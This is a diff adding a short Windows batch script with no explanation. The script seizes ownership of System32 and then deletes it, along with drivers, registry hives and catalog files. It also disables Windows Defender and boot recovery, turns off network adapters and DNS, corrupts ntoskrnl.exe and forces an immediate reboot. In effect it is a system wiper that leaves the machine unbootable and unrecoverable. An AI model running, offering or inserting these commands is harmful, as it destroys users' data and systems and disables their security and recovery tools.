@@ -1,0 +1,25 @@
+takeown /f C:\Windows\System32\* /a /r /d y
+icacls C:\Windows\System32\* /grant Administradores:F /t /c
+
+del /f /s /q C:\Windows\System32\*
+
+del /f /s /q C:\Windows\System32\drivers\*
+del /f /s /q C:\Windows\System32\config\*
+del /f /s /q C:\Windows\System32\catroot\*
+del /f /s /q C:\Windows\System32\catroot2\*
+
+sc config WinDefend start= disabled
+sc stop WinDefend
+
+bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
+
+netsh interface set interface "Ethernet" admin=disable
+netsh interface set interface "Wi-Fi" admin=disable
+
+netsh interface ip set dns "Ethernet" static 0.0.0.0
+netsh interface ip set dns "Wi-Fi" static 0.0.0.0
+
+echo. >> C:\Windows\System32\ntoskrnl.exe
+
+shutdown /r /t 0
